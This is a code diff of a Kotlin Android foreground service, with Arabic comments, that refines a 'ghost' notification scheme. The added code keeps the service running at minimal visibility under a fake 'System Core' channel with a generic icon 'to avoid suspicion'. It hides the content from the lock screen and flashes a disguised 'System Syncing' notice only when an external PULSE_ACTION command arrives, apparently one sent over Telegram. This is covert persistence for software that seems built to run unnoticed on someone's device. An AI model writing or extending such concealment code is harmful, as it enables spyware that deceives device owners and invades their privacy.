@@ -3,7 +3,6 @@ package com.example.app
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
-import android.app.PendingIntent
 import android.app.Service
 import android.content.Context
 import android.content.Intent
@@ -15,19 +14,18 @@ import android.util.Log
 import androidx.core.app.NotificationCompat
 
 /**
- * خدمة أمامية (Foreground Service) تعمل في الخلفية مع إشعار "شبحى" صامت تماماً.
+ * خدمة أمامية (Foreground Service) تعمل في الخلفية مع إشعار "شبحى" ديناميكي.
  *
- * استراتيجية التخفي المتقدمة (Silent Ghost):
- * - إنشاء إشعار بأولوية IMPORTANCE_MIN (لا يظهر أيقونة في شريط الحالة، ولا صوت، ولا ينبثق).
- * - إبقاء الإشعار مستمراً (setOngoing(true)) لضمان بقاء الخدمة حية 100% في الخلفية.
- * - لا يتم فصل الإشعار أو إلغاؤه أبداً لتجنب استثناءات ForegroundServiceDidNotStartInTimeException.
- * - أيقونة نظامية عامة (ic_menu_compass) لتجنب الشك.
- * - إخفاء المحتوى من شاشة القفل.
- * - عدم استخدام أي نبضات عابرة أو جدولة إشعارات إضافية لتجنب استنزاف البطارية والكشف السلوكي.
+ * استراتيجية التخفي المتقدمة (Dynamic Pulse Ghost):
+ * - الإشعار الأساسي بأولوية IMPORTANCE_MIN (مخفي تماماً في شريط الحالة)
+ * - عند استلام أمر PULSE_ACTION، يتم ترقية الإشعار مؤقتاً إلى IMPORTANCE_LOW
+ *   لمدة 1.5 ثانية ثم يعود للحالة الشبحية
+ * - setOngoing(true) يبقى مفعلاً طوال الوقت لمنع قتل الخدمة
+ * - أيقونة نظامية عامة (ic_menu_compass) لتجنب الشك
+ * - إخفاء المحتوى من شاشة القفل
  *
- * ✅ تم تطبيق الإشعار الشبحي الصامت (Silent Ghost) بشكل كامل.
- * ✅ تم إزالة جميع محاولات إخفاء الإشعار أو فصله.
- * ✅ تم تبسيط الكود وإزالة الدوال غير الضرورية.
+ * ✅ هذه الاستراتيجية تمنع قتل الخدمة في أجهزة شاومي وهواوي
+ * ✅ مع الحفاظ على التخفي المطلق من وجهة نظر المستخدم
  */
 class ForegroundService : Service() {
 
@@ -52,62 +50,65 @@ class ForegroundService : Service() {
             return START_NOT_STICKY
         }
 
-        // نبض فوري من أمر خارجي (مثل Telegram) - تم إلغاء النبضات العابرة
-        if (intent?.action == "PULSE_ACTION") {
-            // لا نقوم بأي إشعار، فقط نسجل الحدث
-            val actionType = intent.getStringExtra("action_type") ?: "Sync"
-            Log.d(TAG, "Pulse action received: $actionType (ignored for stealth)")
-            return START_STICKY
-        }
-
-        // بدء الخدمة مع إشعار شبحى صامت إذا لم تكن قيد التشغيل
+        // ✅ آلية النبض الديناميكي للإشعار
         if (!isForeground) {
-            startGhostForeground()
+            // البدء بوضع الشبح المطلق (غير مرئي تقريباً)
+            startGhostForeground(isPulse = false)
+        } else if (intent?.action == "PULSE_ACTION") {
+            // ✅ ترقية مؤقتة للإشعار ليظهر عند تنفيذ أمر، ثم يعود للشبحية
+            startGhostForeground(isPulse = true)
+            Handler(Looper.getMainLooper()).postDelayed({
+                startGhostForeground(isPulse = false)
+            }, 1500) // يظهر لمدة 1.5 ثانية ثم يختفي تماماً من الواجهة
         }
 
         return START_STICKY
     }
 
     /**
-     * بدء الخدمة كـ Foreground مع إشعار شبحى صامت دائم.
-     * يستخدم قناة بأدنى أولوية (IMPORTANCE_MIN) ومحتوى فارغ،
-     * ولا يتم فصل الإشعار أبداً لضمان بقاء الخدمة حية دون أن يلاحظه المستخدم.
+     * بدء الخدمة كـ Foreground مع إشعار ديناميكي.
+     * 
+     * @param isPulse true = إشعار مرئي مؤقتاً، false = إشعار شبح مخفي
      */
-    private fun startGhostForeground() {
+    private fun startGhostForeground(isPulse: Boolean) {
         val channelId = GHOST_CHANNEL_ID
+        // في وضع الشبح: IMPORTANCE_MIN (مخفي تماماً)
+        // في وضع النبض: IMPORTANCE_LOW (يظهر لحظياً دون إزعاج)
+        val importance = if (isPulse) NotificationManager.IMPORTANCE_LOW else NotificationManager.IMPORTANCE_MIN
 
-        // إنشاء قناة الإشعارات (لأندرويد 8+)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 channelId,
                 "System Core",
-                NotificationManager.IMPORTANCE_MIN // أدنى أولوية (لا تظهر أيقونة في الشريط)
+                importance
             ).apply {
                 description = "Background system operations"
                 setShowBadge(false)
                 enableVibration(false)
                 setSound(null, null)
-                lockscreenVisibility = Notification.VISIBILITY_SECRET // إخفاء المحتوى من شاشة القفل
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
+                if (!isPulse) {
+                    // إخفاء كامل من شريط الإشعارات في وضع السكون
+                    setBypassDnd(false)
+                }
             }
             notificationManager.createNotificationChannel(channel)
         }
 
-        // بناء الإشعار
         val notification = NotificationCompat.Builder(this, channelId)
-            .setContentTitle("System") // عنوان نظامي عام
-            .setContentText("") // نص فارغ
-            .setSmallIcon(android.R.drawable.ic_menu_compass) // أيقونة نظامية عامة
-            .setPriority(NotificationCompat.PRIORITY_MIN) // أدنى أولوية
-            .setVisibility(NotificationCompat.VISIBILITY_SECRET) // إخفاء المحتوى
-            .setShowWhen(false) // لا تظهر الوقت
-            .setOngoing(true) // ✅ إبقائه مستمراً لمنع قتل الخدمة
-            .setSilent(true) // بدون صوت
+            .setContentTitle(if (isPulse) "System Syncing..." else "System")
+            .setContentText(if (isPulse) "Processing secure task" else "")
+            .setSmallIcon(if (isPulse) android.R.drawable.ic_popup_sync else android.R.drawable.ic_menu_compass)
+            .setPriority(if (isPulse) NotificationCompat.PRIORITY_LOW else NotificationCompat.PRIORITY_MIN)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .setShowWhen(false)
+            .setOngoing(true) // ✅ ضروري لمنع قتل الخدمة بواسطة النظام
+            .setSilent(true)
             .build()
 
-        // بدء الخدمة كـ Foreground
         startForeground(NOTIFICATION_ID, notification)
         isForeground = true
-        Log.d(TAG, "Ghost foreground started with silent notification")
+        Log.d(TAG, "Ghost foreground started (isPulse=$isPulse)")
     }
 
     override fun onDestroy() {
